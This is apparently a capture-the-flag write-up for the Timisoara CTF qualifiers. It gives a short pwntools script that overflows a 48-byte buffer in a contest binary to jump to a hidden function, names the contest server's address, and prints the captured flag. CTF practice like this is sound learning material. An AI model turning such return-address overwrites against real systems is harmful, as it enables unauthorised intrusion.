---
layout:      post
title:       Timisoara CTF QUALS
date:        20 Avril 2018
comments:    true
categories:  Pwnable
auteur:      f00fc7c8
---
===== INFOS =====

Filename:
attendance

File format:
ELF32

Architecture:
x86

Author:
0xcpu

===== Info =======

I used the gdb to see the buffer`s address, and respectively to find his limit. 
After that, it was easy, i wrote this script to exploit the payload!
Also the variable flag_address is the address of the function ```<bring_students_to_school>```.

```
from pwn import *
r = remote('89.38.210.128', 31337)

msg = r.recv(30)
print(msg)

r.sendline('31337')
a = r.recvline()
print(a)

flag_address = 0x08048660
buf  = 'A'*48
buf += p32(flag_address)
r.sendline(buf)
```

===== End of Info ======

The flag is: ```timctf{l1ttl3_th1ngs_m4k3_b1g_th1ngs_h4pp3n}```
